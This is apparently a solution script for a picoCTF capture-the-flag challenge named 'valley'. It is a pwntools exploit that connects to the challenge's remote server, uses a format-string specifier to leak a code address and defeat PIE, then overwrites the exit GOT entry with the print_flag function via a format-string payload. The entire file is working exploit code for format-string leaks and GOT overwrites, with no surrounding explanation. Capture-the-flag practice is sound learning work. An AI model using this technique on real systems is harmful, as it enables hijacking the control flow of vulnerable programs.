from pwn import *

# Load the binary and compute offsets
elf = context.binary = ELF('./valley')
print_flag_offset = elf.symbols['print_flag'] - elf.address  # Offset of print_flag from PIE base
exit_got_offset = elf.got['exit'] - elf.address              # Offset of exit@got.plt from PIE base

# Connect to the remote host
r = remote("shape-facility.picoctf.net", 56637)

# Step 1: Leak a code address to bypass PIE
r.sendlineafter(b"Shouting: \n", b"%7$p")
response = r.recvuntil(b"You heard", timeout=2).decode()

# Extract the leaked address safely
if "You heard" not in response:
    log.failure("Failed to leak address. Adjust the format string offset.")
    r.close()
    exit()

leaked_part = response.split("You heard")[0].strip()
if not leaked_part.startswith("0x"):
    log.failure(f"Invalid leaked value: {leaked_part}")
    r.close()
    exit()

try:
    leaked_addr = int(leaked_part, 16)
except ValueError:
    log.failure(f"Invalid leaked address: {leaked_part}")
    r.close()
    exit()

log.success(f"Leaked address: {hex(leaked_addr)}")

# Step 2: Calculate PIE base and target addresses
pie_base = leaked_addr - (elf.symbols['main'] - elf.address)  # Adjust based on the leaked function
print_flag = pie_base + print_flag_offset
exit_got = pie_base + exit_got_offset

# Step 3: Overwrite exit@got.plt with print_flag
context.update(arch="amd64")
payload = fmtstr_payload(6, {exit_got: print_flag})  # Adjust offset (6)

# Step 4: Trigger exit and get flag
r.sendline(payload)
r.sendline(b"exit")
print(r.clean().decode())
r.close()
